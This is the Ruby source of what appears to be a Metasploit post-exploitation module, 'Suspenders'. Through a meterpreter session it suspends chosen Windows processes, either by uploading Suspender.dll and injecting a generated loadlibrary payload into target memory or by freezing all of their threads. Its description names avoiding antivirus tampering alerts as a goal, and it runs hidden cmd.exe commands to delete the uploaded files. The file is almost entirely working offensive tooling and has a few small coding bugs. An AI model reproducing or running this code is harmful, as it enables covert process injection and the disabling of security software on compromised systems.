# based on meterpreter script suspender.rb by Kerberos, which is based on mubix' blog post at
# http://www.room362.com/blog/2011/5/30/remote-dll-injection-with-meterpreter.html which is
# predicated on Didier Stevens code & blog at http://blog.didierstevens.com/2011/04/27/suspender-dll/
#
#
# TODO:
# -> Test x64 support

require 'msf/core'
require 'msf/core/post/file'
#require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Auxiliary::Report
		#TODO:  Report the process as suspended.
	include Msf::Post::File
	
	def initialize(info={})
		super( update_info( info,
				'Name' => 'Suspenders',
				'Description' => %q{ This module suspends a list of given processes after a given
				delay.  This is accomplished one of two ways.  First, Suspender.dll can be injected
				into the target process.  Second, the meterpreter API can be used to suspend each
				thread in the target process.  To use the Suspender.dll approach you'll have to
				download Suspender.dll (just once), see References for URL.  The module will
				check for the dll at data/suspender/x86/Suspender.dll when a path is not given.  The
				minimum delay for the dll method is 1 second and 0 will automatically be increased.
				The Suspender.dll method currently requires a file upload to the target, however it's
				less likely to trigger a "tampering" warning from certain processes (such as AV
				processes) than the meterpreter API method.  PIDs will be suspended in the order
				they are listed, and process names, if any, will be translated to pids and appended,
				in order, to the list of PIDs (however no process will be suspended twice).  The
				current process in which meterpreter is running is automatically blocked from
				suspension (for your protection).  The module will automatically detect the process
				architecture and inject the appropirate dll assuming you have supplied them correctly.

				This module is a port of the meterpreter script of the same name by kerberos, which
				was inspired by mubix's blog which was inpsired by Didier Stevens' Suspender.dll. },
				'License' => MSF_LICENSE,
				'Author' => [	'kerberos', # original meterpreter script
								'kernelsmith' # post module, ability to do multiple processes, 64bit
							],
				'Version' => '$Revision$',
				'Platform' => [ 'windows' ],
				'SessionTypes' => [ 'meterpreter' ],
				'References'     =>
					[
						[ 'URL', 'http://blog.didierstevens.com/2011/04/27/suspender-dll/' ],
						[ 'URL', 'http://www.room362.com/blog/2011/5/30/remote-dll-injection-with-meterpreter.html' ],
						[ 'URL', 'http://pastebin.com/tTQASf7R' ],
					]
		))
		register_options(
			[
				OptString.new('PIDS', [false, 'Target process ID list, comma seperated, to suspend',
					nil]),
				OptString.new('PROCESSES', [false,
					'Target process names, comma sep, to suspend (this or PIDS must be set)', nil]),
				OptInt.new('DELAY', [true, 'The delay, in seconds, to wait before suspension', 0]),
			#	OptBool.new('UNSUSPEND', [false, 'I am not sure this can be implemented',false]),
				OptBool.new('USE_DLL', [true,
					'Do NOT use Suspender.dll, this method might bother AVs',true]),
				@@suspender32 = OptPath.new('SUSPENDER_DLL', [false,
					"Local path to the 32-bit Suspender.dll, req'd if USE_DLL", nil]),
				@@suspender64 = OptPath.new('SUSPENDER_DLL64', [false,
					"Local path to the 64-bit dll, req'd if USE_DLL & 64-bit OS", nil]),
				OptBool.new('HALT', [true, 'Halt further suspension if any failure is encountered',
					false])
			], self.class)
	end

	def run
		# validate and assign option values
		pids = []
		if (datastore['PIDS'] and not datastore['PIDS'].empty?)
			pids = pids + datastore['PIDS'].split(',')
		end
		processes = []
		if (datastore['PROCESSES'] and not datastore['PROCESSES'].empty?)
			processes = processes + datastore['PROCESSES'].split(',')
		end
 
		delay = datastore['DELAY']
		if (delay < 1 and datastore['USE_DLL'])
			print_status "Minimum delay for the DLL method is 1, changing delay to 1"
			delay = 1
		end
		sysinfo = session.sys.config.sysinfo
		#undo = datastore['UNSUSPEND']
		tempdir = session.fs.file.expand_path("%TEMP%") || "C:\\"
		if datastore['USE_DLL']
			# we need 32-bit suspender.dll to be there regardless of target OS arch as
			# processes on a 64-bit OS may be either 32 or 64
			suspenders = {}
			# check if datastore entry is valid & 32bit
			if (datastore['SUSPENDER_DLL'] and @@suspender32.valid?(datastore['SUSPENDER_DLL']))
				if get_pe_arch(datastore['SUSPENDER_DLL']) == 32
					# then let's use it
					suspenders[32] = datastore['SUSPENDER_DLL']
				else
					print_error("{datastore['SUSPENDER_DLL']} is not a 32-bit dll, naughty boy")
					raise Rex::Script::Completed
				end
			else # check if the default location has a valid 32-bit dll
				susp_path = ::File.join(Msf::Config.data_directory,'suspender','x86','Suspender.dll')
				if @@suspender32.valid?(susp_path)
					if get_pe_arch(susp_path) == 32
						# then let's use it
						suspenders[32] = susp_path
					else
						print_error("{susp_path} is not a 32-bit dll")
						raise Rex::Script::Completed
					end
				else
					raise OptionValidateError.new('SUSPENDER_DLL'),
					"Could not find 32-bit Suspender.dll.  " +
					"A good location to put Suspender.dll is #{susp_path}"
				end
			end
			# we don't need to validate 64-bit suspender.dll if target OS isn't 64-bit
			if sysinfo['Architecture'] =~ /64/
				# check if datastore entry is valid & 64bit
				if (datastore['SUSPENDER_DLL64'] and @@suspender64.valid?(datastore['SUSPENDER_DLL64']))
					if get_pe_arch(datastore['SUSPENDER_DLL64']) == 64
						# then let's use it
						suspenders[64] = datastore['SUSPENDER_DLL64']
					else
						print_error("{datastore['SUSPENDER_DLL64']} is not a 64-bit dll")
						raise Rex::Script::Completed
					end
				else # check if the default location has a valid 64-bit dll
					susp_path = ::File.join(Msf::Config.data_directory,'suspender','x64','Suspender.dll')
					if @@suspender64.valid?(susp_path)
						if get_pe_arch(susp_path) == 64
							# then let's use it
							suspenders[64] = susp_path
						else
							print_error("{susp_path} is not a 64-bit dll")
							raise Rex::Script::Completed
						end
					else
						raise OptionValidateError.new('SUSPENDER_DLL64'),
						"Could not find 64-bit Suspender.dll.  " +
						"A good location to put Suspender.dll is #{susp_path}"
					end
				end
			end
		end
		
		@@halt = datastore['HALT']

		# check that pids and/or process names are provided and that pid != 0
		if ( (pids.empty? or pids.include?(0)) and (processes.empty?) )
			# suspending PID 0 will eventually bork the box
			print_error "PIDS and PROCESSES can't both be empty... and PIDS can't contain 0"
			raise Rex::Script::Completed
		end

		# resolve the pids if nec
		if ( processes and not processes.empty? )
			print_status "Resolving the process names to PIDs"
			pids = pids + resolve_process_names_to_pids(processes)
		end
		
		# validate (& cleanup) pids
		pids_hash = validate_pids(pids)

		if (pids_hash.nil? or pids_hash.empty?)
			print_error "No valid pids were found.  Exiting."
			raise Rex::Script::Completed # should we skip the stack trace on this error state?
		end

		# proceed based on which method was chosen
		if datastore['USE_DLL']
			suspend_using_dll(pids_hash,delay,tempdir,suspenders)
		else # use the meterpreter api
			suspend_using_api(pids,delay)
		end
	end

	def resolve_process_names_to_pids(processes)
		return [] if (processes.class != Array or processes.empty?)
		pids = []
		processes.each do |process|
			# this will return first process encountered w/this name
			# use the PIDS approach if you have multiple processes with the same name
			pid = client.sys.process[process]
			if pid 
				pids << pid
				vprint_status "Found PID:  #{pid}"
			else 
				check_halt "Could not find a process with the name #{process}..."
			end
		end
		pids
	end

	def normalize_arch_to_i(arch)
		return 32 if arch.to_s =~ /x86$|32/
		return 64 if arch.to_s =~ /64$/
		return nil
	end

	def validate_pids(pids)
		# takes an array, returns a hash with: {pid => arch}
		# 		like {1440 => 32, 205 => 64}
		# do the following to each pid:
		# - convert to integer
		# - remove pid 0 to protect the system's stability
		# - remove the current meterp pid to avoid suspending our own process
		# - determine the process architecture
		# - remove redundant entries
		return {} if (pids.class != Array or pids.empty?)
		clean_pids = {}
		host_processes = session.sys.process.get_processes
		if host_processes.length < 1
			print_error "No running processes found on the target host."
			return {}
		end
		
		# get the current session pid so we don't suspend it later
		mypid = session.sys.process.getpid.to_i

		# we convert to integers here separately because we want to uniq this array first so we
		# can avoid redundant lookups later
		pids.each_with_index do |pid,idx|
			next if pid.nil?
			pids[idx] = pid.to_i
		end
		# uniq'ify
		pids.uniq!
		# now we look up the pids & arch's & remove bad stuff
		pids.each do |pid|
			next if pid.nil?
			if pid == 0
				check_halt "Found PID 0 in the list..."
				print_status "Removing PID 0 from the list"
			elsif pid == mypid
				check_halt "Found my own PID in the list..."
				print_status "Removing #{pid.to_s} from the list"
			else
				# find the process with this pid and get it's arch
				theprocess = host_processes.select {|x| x if x["pid"] == pid}.first
				if ( theprocess.nil? )
					check_halt("Could not find a process on the host with pid #{thepid.to_s}...")
					print_status "Removing #{thepid.to_s} from the list"
					next
				else
					clean_pids[pid] = normalize_arch_to_i(theprocess["arch"])
				end
			end
		end
		# return clean pids as a hash
		return clean_pids
	end

	def check_halt(msg,halt=@@halt)
		print_error msg
		if halt
			print_error "Halting.  (set HALT false to change this behavior)"
			raise Rex::Script::Completed
		else
			vprint_status "Continuing..."
		end
	end

	def suspend_using_api(pids,delay)
		# http://www.room362.com/blog/2011/5/30/remotely-suspend-all-threads-with-meterpreter.html
		# "There are a few AVs engines that detected this as tampering. But if your target isn't AV..."
		targetprocess = nil
		begin
			pids.each do |pid|
				select(nil, nil, nil, delay)
				print_status("Targeting process with PID #{pid}...")
				targetprocess = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
				vprint_status "Suspending threads"
				targetprocess.thread.each_thread do |x|
    				targetprocess.thread.open(x).suspend
				end
			end
		rescue ::Rex::Post::Meterpreter::RequestError => e
			print_error "Error suspending the process threads:  #{e.to_s}"
			check_halt "You may not have the correct permissions, try migrating to " +
						"a proces with the same owner as the target process(es).  Also " +
						"consider running the win_privs post module and confirm SeDebug priv."
		ensure
			targetprocess.close if targetprocess
		end
	end

	def suspend_using_dll(pids,delay,uploadpath,suspenders)
		# pids should be a hash like { pid => arch, 1025 => 32, 2043 => 64 }
		# suspenders should be a hash like { arch => dll, 32 => lpath2dll, 64 => lpath2dll64 }
		ploads = {}
		uploads = {}
		begin
			# Create payloads, do this first so we don't have to delete files if this fails
			suspenders.each_pair do |arch,dll|
				if normalize_arch_to_i(arch) == 64
					vprint_status("Creating 64-bit dll injector payload...")
					pay = session.framework.payloads.create("windows/x64/loadlibrary")
					uploads[64] = pay.datastore['DLL'] = 
						"#{uploadpath}\\#{Rex::Text.rand_text_alpha((rand(3)+7))}#{delay.to_s}.dll"
					pay.datastore['EXITFUNC'] = 'thread'
					ploads[64] = pay.generate
				elsif normalize_arch_to_i(arch) == 32
					vprint_status("Creating 32-bit dll injector payload...")
					pay = session.framework.payloads.create("windows/loadlibrary")
					uploads[32] = pay.datastore['DLL'] = 
						"#{uploadpath}\\#{Rex::Text.rand_text_alpha((rand(3)+3))}#{delay.to_s}.dll"
					pay.datastore['EXITFUNC'] = 'thread'
					ploads[32] = pay.generate
				else
					print_error "Did not recognize suspender architecture, expected [32|64]"
					raise Rex::Script::Completed
				end
			end
		rescue RuntimeError => e
			print_error("Error generating payload #{e.to_s}, can't continue.")
			raise Rex::Script::Completed
		end
		begin
			# Upload suspender(s) to target
			vprint_status "Uploading Suspender payload(s) to:"
			uploads.each_value do |path|
				print_line "\t#{path}"
			end
			vprint_status "You may have to delete these files yourself"
			uploads.each_pair do |arch,pay|
				session.fs.file.upload_file("#{pay}", "#{suspenders[arch]}")
			end
			# TODO:  Report file uploads
			# TODO:  inject directly into memory instead of uploading first
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error "Error uploading Suspender.dll payload:  #{e.to_s}, can't continue"
			raise Rex::Script::Completed
		end
		# do injects
		proc = nil
		pids.each_pair do |pid,arch|
			begin
				vprint_status("Targeting the #{arch.to_s}-bit process with " +
								"PID=#{pid} using #{suspenders[arch]}...")
				raw = ploads[arch]
				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
				mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
				vprint_status("Injecting payload")
				targetprocess.memory.write(mem, raw)
				vprint_status("Executing payload")
				targetprocess.thread.create(mem, 0)
			rescue Rex::Post::Meterpreter::RequestError => e
				print_error "Error injecting payload {e.to_s}, you may not have permission..."
				check_halt "You may not have the correct permissions (PROCESS_ALL_ACCESS)..."
			ensure
				# Let's ensure we close the open process if it's open
				targetprocess.close if targetprocess
			end
		end
		# Attempt clean up
		print_status("Attempting to delete:")
		uploads.each_value do |up|
			print_line "\t#{up}"
		end
		# in most situations these attempts won't work so we eat the errors raised
		some_files_could_not_be_removed = false
		uploads.each_value do |up|
			begin
				session.fs.file.rm(up) # try to remove using API first
			rescue Rex::Post::Meterpreter::RequestError
				some_files_could_not_be_removed = true
			end
			# and now the shell if the file still exists
			#TODO:  put this in a loop so it will keep trying to delete until it succeeds
			if file_exist?(up)
				begin
					session.sys.process.execute(
						"cmd.exe /c attrib -r #{up} && del #{up}",nil, {'Hidden' => true} )
				rescue Rex::Post::Meterpreter::RequestError
					some_files_could_not_be_removed = true
				end
			end
		end
		msg = "Could not remove some uploaded files as expected, you'll have to " + 
				"remove them after you release/kill the suspended process(es)"
		if some_files_could_not_be_removed
			print_status(msg)
		else
			print_good "Successfuly deleted all uploads"
		end
	end

	def get_pe_arch(pe_file)
		# returns int, either 32 or 64, or nil if unknown
		pe = Rex::PeParsey::Pe.new_from_file(pe_file)
		if pe.ptr_32?
			return 32
		elsif pe.ptr_64?
			return 64
		else
			return nil
		end
	end

end
